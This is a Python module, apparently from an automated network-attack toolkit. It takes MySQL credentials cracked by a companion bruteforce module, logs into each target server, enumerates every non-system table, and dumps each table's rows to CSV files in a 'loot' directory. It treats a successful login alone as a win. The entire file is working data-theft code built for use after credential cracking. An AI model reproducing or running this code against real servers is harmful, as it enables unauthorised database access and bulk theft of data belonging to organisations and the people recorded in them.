"""
steal_data_sql.py - Connects to MySQL servers with cracked credentials, enumerates
non-system tables, and dumps each to a CSV under the loot directory.

#12: scaffolding lives in base_stealer.BaseStealer. "Files" are tables; harvest is
overridden. A successful auth with zero tables is still a cracked credential and is
recorded as success (the login-is-the-win path).
"""

import csv
import logging
import os
import re
from sqlalchemy import create_engine, text

from base_stealer import BaseStealer, MAX_FILE_BYTES, MAX_RUN_BYTES, MIN_FREE_BYTES
from logger import Logger
from shared import SharedData

logger = Logger(name="steal_data_sql.py", level=logging.DEBUG)

b_class = "StealDataSQL"
b_module = "steal_data_sql"
b_status = "steal_data_sql"
b_parent = "SQLBruteforce"
b_port = 3306

MAX_ROWS = 100_000


class StealDataSQL(BaseStealer):
    """Steal table data from MySQL servers as CSVs."""

    CRED_FILE_ATTR = "sqlfile"
    LOOT_SUBDIR = "sql"
    CONNECTED_FLAG = "sql_connected"
    LOGGER = logger

    def load_credentials(self, ip):
        """SQL CSV may use DictReader shape (IP Address, User, Password, Database)."""
        path = getattr(self.shared_data, self.CRED_FILE_ATTR)
        credentials = []
        if not os.path.exists(path):
            return credentials
        try:
            with open(path, newline="", encoding="utf-8", errors="replace") as f:
                reader = csv.DictReader(f)
                for cred in reader:
                    if cred.get("IP Address") == ip or cred.get("IP") == ip:
                        credentials.append((
                            cred.get("User", "") or cred.get("Username", ""),
                            cred.get("Password", ""),
                        ))
        except Exception:
            with open(path, 'r') as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split(',')
                    if len(parts) > 4 and parts[1] == ip:
                        credentials.append((parts[3], parts[4]))
        seen = set()
        unique = []
        for pair in credentials:
            if pair not in seen:
                seen.add(pair)
                unique.append(pair)
        logger.info(f"Found {len(unique)} credentials for {ip}")
        return unique

    def open_session(self, ip, username, password):
        connection_str = f"mysql+pymysql://{username}:{password}@{ip}:3306"
        engine = create_engine(connection_str, connect_args={"connect_timeout": 10})
        with engine.connect() as conn:
            conn.execute(text("SELECT 1"))
        self.mark_connected()
        logger.info(f"Connected to {ip} via SQL with username {username}")
        return engine

    def close_session(self, conn):
        try:
            conn.dispose()
        except Exception:
            pass

    def find_tables(self, engine):
        try:
            if self.shared_data.orchestrator_should_exit:
                return []
            query = text("""
            SELECT TABLE_NAME, TABLE_SCHEMA
            FROM INFORMATION_SCHEMA.TABLES
            WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
            AND TABLE_TYPE = 'BASE TABLE'
            """)
            with engine.connect() as conn:
                result = conn.execute(query)
                tables = [(row[0], row[1]) for row in result]
            logger.info(f"Found {len(tables)} tables across all databases")
            return tables
        except Exception as e:
            logger.error(f"Error finding tables: {e}")
            return []

    def steal_file(self, engine, table_schema_pair, local_dir):
        """Dump one table to CSV. table_schema_pair is (table, schema)."""
        table, schema = table_schema_pair
        if not self.check_budget(local_dir):
            return
        if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
            return
        if not re.fullmatch(r'[A-Za-z0-9_$]+', schema or '') or not re.fullmatch(r'[A-Za-z0-9_$]+', table or ''):
            logger.error(f"Refusing SQL steal of non-identifier {schema}.{table}")
            return
        local_file_path = None
        try:
            query = text(f"SELECT * FROM `{schema}`.`{table}` LIMIT {MAX_ROWS}")
            os.makedirs(local_dir, exist_ok=True)
            local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
            row_count = 0
            with engine.connect() as conn:
                result = conn.execute(query)
                fieldnames = list(result.keys())
                with open(local_file_path, "w", newline="", encoding="utf-8") as f:
                    writer = csv.writer(f)
                    writer.writerow(fieldnames)
                    for row in result:
                        writer.writerow(list(row))
                        row_count += 1
            size = os.path.getsize(local_file_path) if os.path.exists(local_file_path) else 0
            if not self.fits_budget(size):
                logger.warning(
                    f"SQL dump {schema}.{table} is {size} bytes — over budget, deleting")
                try:
                    os.unlink(local_file_path)
                except OSError:
                    pass
                self.stop_execution = True
                return
            self.note_bytes(size)
            logger.success(
                f"Downloaded data from table {schema}.{table} to {local_file_path} "
                f"({row_count} rows, {size} bytes)")
        except Exception as e:
            logger.error(f"Error downloading data from table {schema}.{table}: {e}")
            try:
                if local_file_path and os.path.exists(local_file_path):
                    os.unlink(local_file_path)
            except OSError:
                pass

    def find_files(self, conn, dir_path):
        return []

    def harvest(self, conn, ip, row):
        """Override: tables instead of files. Successful auth alone is a win (login-is-the-win)."""
        local_dir = self.loot_dir(ip, row)
        tables = self.find_tables(conn)
        for table, schema in tables:
            if getattr(self, 'stop_execution', False) or self.shared_data.orchestrator_should_exit:
                break
            self.steal_file(conn, (table, schema), local_dir)
        if tables:
            logger.success(f"Successfully stolen data from {len(tables)} tables on {ip}")
        else:
            logger.info(f"Authenticated to {ip} with zero non-system tables — recording as success")
        return True


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_data_sql = StealDataSQL(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
